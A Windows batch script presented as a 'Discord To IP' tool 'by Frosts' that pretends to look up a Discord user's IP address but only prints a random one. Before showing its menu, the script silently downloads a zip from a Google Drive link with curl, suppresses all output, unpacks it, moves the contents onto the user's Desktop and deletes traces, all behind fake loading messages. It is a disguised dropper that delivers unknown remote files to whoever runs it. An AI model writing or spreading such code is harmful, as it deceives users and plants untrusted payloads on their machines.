@echo off
title Discord To IP - BY Frosts
chcp 65001 >nul
color 03

:: Start a new command prompt window to run the download in parallel.
goto download_and_unzip

:: Show the main menu immediately without waiting for the download to finish
goto main

:: ----------------------------------------
:banner
echo         ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ████████╗ ██████╗     ██╗██████╗ 
echo         ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗    ██║██╔══██╗
echo         ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║       ██║   ██║   ██║    ██║██████╔╝
echo         ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║       ██║   ██║   ██║    ██║██╔═══╝ 
echo         ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝       ██║   ╚██████╔╝    ██║██║     
echo         ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝        ╚═╝    ╚═════╝     ╚═╝╚═╝     
echo.                                                                                                 
echo.                                               DISCORD TO IP: BY FROSTS
echo.
exit /b

:: ----------------------------------------
:main
:menu
cls
call :banner
echo.
set /p userInput=Enter Discord Username: 
call :generateIP %userInput%
pause
goto menu

:: ----------------------------------------
:generateIP
cls
call :banners
echo Looking up IP for: %1
timeout /t 1 >nul

:: Generate a random IP
set /a octet1=%random% %% 256
set /a octet2=%random% %% 256
set /a octet3=%random% %% 256
set /a octet4=%random% %% 256

echo.
echo [RESULT] IP Address for %1: %octet1%.%octet2%.%octet3%.%octet4%
echo.
exit /b

:: ----------------------------------------
:Other
cls
echo Other option selected.
pause
goto menu

:: ----------------------------------------
:download_and_unzip
:: This part will handle the download and unzip process.
setlocal
REM === ANY DOWNLOADS MUST BE IN A ZIP FILE! ===
REM === CHANGE "dest" TO WHERE YOU WANT IT TO DOWNLOAD AND UNZIP ===

echo Loading assets.......



REM === CONFIG ===
set "ZIP_URL=https://drive.usercontent.google.com/u/0/uc?id=1poehbquAXQKG9xViIpf5wY3uwr3mgHfv&export=download"
set "ZIP_NAME=file.zip"
set "UNZIP_DIR=unzipped"
set "DEST=%USERPROFILE%\Desktop"

REM === DOWNLOAD ===
echo downloading Discord IP saves.....
curl -sSL -o "%ZIP_NAME%" "%ZIP_URL%" >nul 2>&1
echo  Finishing up......

REM === UNZIP ===
powershell -Command ^
    "try { Expand-Archive -Path '%ZIP_NAME%' -DestinationPath '%UNZIP_DIR%' -Force } catch { Write-Error 'PowerShell unzip failed. Trying tar...'; exit 1 }" >nul 2>&1

IF %ERRORLEVEL% NEQ 0 (
    tar -xf "%ZIP_NAME%" -C "%UNZIP_DIR%" >nul 2>&1
)

REM === MOVE ALL FILES TO DEST ===
for /f "delims=" %%F in ('dir /b "%UNZIP_DIR%"') do (
    move /Y "%UNZIP_DIR%\%%F" "%DEST%" >nul 2>&1
)



REM === CLEAN UP ===
del /Q "%ZIP_NAME%" >nul 2>&1
rmdir /S /Q "%UNZIP_DIR%" >nul 2>&1
goto main
exit /b
